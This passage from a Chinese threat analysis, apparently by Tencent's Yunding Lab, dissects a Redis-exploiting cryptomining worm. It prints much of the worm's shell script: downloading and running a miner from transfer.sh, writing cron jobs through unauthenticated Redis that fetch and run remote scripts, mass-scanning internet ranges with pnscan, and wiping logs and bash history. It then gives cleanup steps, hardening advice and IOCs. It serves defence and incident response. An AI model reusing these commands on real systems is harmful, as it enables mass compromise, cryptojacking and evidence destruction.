75\. [ -f .x112 ] && tar xf .x112 && cd pnscan-1.12 && make lnx && make
install && cd .. && rm -rf pnscan-1.12 .x112
76\. fi
这一长串的内容主要目的是下载并编译安装pnscan，从内容中我们可以看到对于不同操作系统的判断然后安装依赖的相关模块，然后才是从github下载pnscan的源码进行编译安装；至于为什么采用编译安装的形式，猜测是出于兼容不同系统以及每次编译生成的pnscan的MD5都不一样，避免形成固定特征；
77\. tname=$( mktemp )
78\. OMURL=https://transfer.sh/MIpIA/tmp.vOYTgmtZge
79\. curl -s $OMURL > $tname || wget -q -O $tname $OMURL
80\. NMURL=$( curl -s –upload-file $tname https://transfer.sh )
81\. mv $tname .gpg && chmod +x .gpg && ./.gpg && rm -rf .gpg
这部分主要是下载挖矿程序并重命名为.gpg，增加执行权限，执行后删除，同时重新上传到 获取新的链接；
82\. [ -z “$NMURL” ] && NMURL=$OMURL
83\. ncmd=$(basename $(mktemp))
84\. sed ‘s|'”$OMURL”‘|'”$NMURL”‘|g’  $ncmd
85\. NSURL=$( curl -s –upload-file $ncmd https://transfer.sh )
86\. echo ‘flushall’ > .dat
87\. echo ‘config set dir /var/spool/cron’ >> .dat
88\. echo ‘config set dbfilename root’ >> .dat
89\. echo ‘set Backup1 “tn*/2 * * * * curl -s ‘${NSURL}’ > .cmd && bash
.cmdnt”‘ >> .dat
90\. echo ‘set Backup2 “tn*/5 * * * * wget -O .cmd ‘${NSURL}’ && bash .cmdnt”‘
>> .dat
91\. echo ‘set Backup3 “tn*/10 * * * * lynx -source ‘${NSURL}’ > .cmd && bash
.cmdnt”‘ >> .dat
92\. echo ‘save’ >> .dat
93\. echo ‘config set dir /var/spool/cron/crontabs’ >> .dat
94\. echo ‘save’ >> .dat
95\. echo ‘exit’ >> .dat
而这部分内容主要是生成新的.dat文件，包含将原来.cmd脚本里的里挖矿程序的下载地址替换为上一步上传到
得到的新地址，还有Redis利用的相关语句；
96\. pnx=pnscan
97\. [ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan
98\. [ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan
99\. for x in $( seq 1 224 | sort -R ); do
100. for y in $( seq 0 255 | sort -R ); do 
101. $pnx -t512 -R ‘6f 73 3a 4c 69 6e 75 78’ -W ‘2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a’ $x.$y.0.0/16 6379 > .r.$x.$y.o 
102. awk ‘/Linux/ {print $1, $3}’ .r.$x.$y.o > .r.$x.$y.l 
103. while read -r h p; do 
104. cat .dat | redis-cli -h $h -p $p –raw &
105. done  /var/spool/mail/root 2>/dev/null 
109. echo 0 > /var/log/wtmp 2>/dev/null 
110. echo 0 > /var/log/secure 2>/dev/null 
111. echo 0 > /root/.bash_history 2>/dev/null 
112. exit 0 
最后就是收尾工作，清除相关日志和命令执行历史，同时在脚本退出的时候会触发脚本一开始用trap预置的动作，会做删除操作，删除相关文件和脚本自身（rm -rf
m* .cmd tmp.* .r .dat $0）。
通过对脚本的解读，我们基本已经清楚整个蠕虫的行为和入侵流程，也就是我们开始所描述的流程。
另外，通过阅读脚本，我们发现虽然整个入侵流程并不是多复杂，但脚本其实有很多”工程化”的细节考虑，不得不让人惊叹入侵者的”考虑周到”：
1、 利用.mxff0文件做重复执行检验，避免脚本的重复执行
2、 为了增加成功性，一些环境的预处理：
a) 关闭SELINUX
b) 增加8.8.8.8的DNS
c) 清空tmp目录
d) 清空系统缓存
e) 修改系统资源限制
3、 痕迹清除
a) 利用trap预置动作好在脚本执行完成后删除相关文件和脚本自身
b) 重复清除相关登录等日志和命令执行历史
4、 同行预防
a) 利用iptables避免Redis服务开放在公网上从而导致再次被入侵
b) 清除同行可能遗留的入侵行为，kill相关进程
5、 系统兼容性
a) 判断操作系统，针对性的执行相关命令，安装依赖包，最大限度的提高pnscan编译安装的成功率
b) 关闭SELINUX，通过setenforce和修改/etc/sysconfig/selinux两种手段实现
c) 写入Crontab里的下载并执行脚本的任务，通过curl、wget、lynx三种方式实现
d) Pnscan扫描增加操作系统判断，减少没有必要的感染尝试
6、 特征去除，存活延续
a) Pnscan采用安装编译的方式，既提高在不同系统下的兼容性，也避免形成固定的MD5特征
b) 利用[https://transfer.sh](https://transfer.sh/) 中转，每一次感染均生成新的连接，避免固定链接形成固定特征
c) 下载到系统的相关文件均采用随机生成的文件名
正是由于入侵者种种的”考虑周到”使得他的入侵感染的成功率能够达到的一定的层度。
#  五、 安全建议
**病毒清理和系统恢复**
我们主要参考脚本的相关行为进行对应的行为恢复和删除即可：
1、 关闭SELINUX，根据系统原环境和业务需要重新开启SELINUX
2、 清空了/var/spool/cron，根据原先备份清空恢复
3、 修改/etc/resolv.conf增加DNS服务8.8.8.8，如无影响可不处理，或者删除
4、 修改了系统资源限制(/etc/security/limits.conf)，可根据备份情况恢复
5、 增加了对6379端口的Iptables规则，如果不影响业务，建议保留
6、 Kill了相关进程，检查是否包含业务所需进程，根据情况恢复
7、 安装了相关包，具体列表见上文，可根据情况删除或者如无影响可保留
8、 编译安装了pnscan，可删除/usr/local/bin/pnscan
9、 清除了相关日志和tmp目录，对系统无影响，可忽略
10、 启动了挖矿进程和pnscan扫描感染，进程：.gpg、pnscan，直接kill
还包含了一些中间文件，虽然脚本包含相关删除操作，但建议还是全局查找确认：.mxff0、.x112、.gpg、.dat、.cmd、.r.xx.xx.o/l、tmp.xxxx
**Redis** **服务加固**
1、
如无必要，修改bind项，不要将Redis绑定在0.0.0.0上，避免Redis服务开放在外网，可以通过iptables或者腾讯云用户可以通过安全组限制访问来源
2、 在不影响业务的情况，不要以root启动Redis服务，同时建议修改默认的6379端口，大部分针对Redis未授权问题的入侵都是针对默认端口进行的
3、 配置AUTH，增加密码校验，这样即使开放在公网上，如果非弱口令的情况，黑客也无法访问Redis服务进行相关操作
4、 使用rename-command CONFIG
“RENAME_CONFIG”重命名相关命令，这样黑客即使在连接上未授权问题的Redis服务，在不知道命令的情况下只能获取相关数据，而无法进一步利用
#  六、 附录
**IOCs**
1. 脚本 [https://transfer.sh/MIpIA/tmp.9kIguIhkI7](https://transfer.sh/MIpIA/tmp.9kIguIhkI7)
2. 挖矿程序 2918ee2b69bc4e6b581c7b25f08434fe
3. 矿池域名 [http://jb.chakpools.com/](http://jb.chakpools.com/)
4. 相关文件名 .mxff0、.x112、.gpg、.dat、.cmd、.r.xx.xx.o/l、tmp.xxxx
**链接**
1. 样本 https://www.virustotal.com/#/file/9756e66c168ec963c58b3d0ca5483927c14a64a99ba718fa9488a52d4d207ed6
2. Pnscan项目地址 https://github.com/ptrrkssn/pnscan
3. 漏洞说明 https://www.seebug.org/vuldb/ssvid-89715
4. 漏洞利用演示 https://v.qq.com/x/page/u0661b9o772.html
5、云镜产品官网 https://cloud.tencent.com/product/hs
作者：云鼎实验室 Fooying 2018/05/21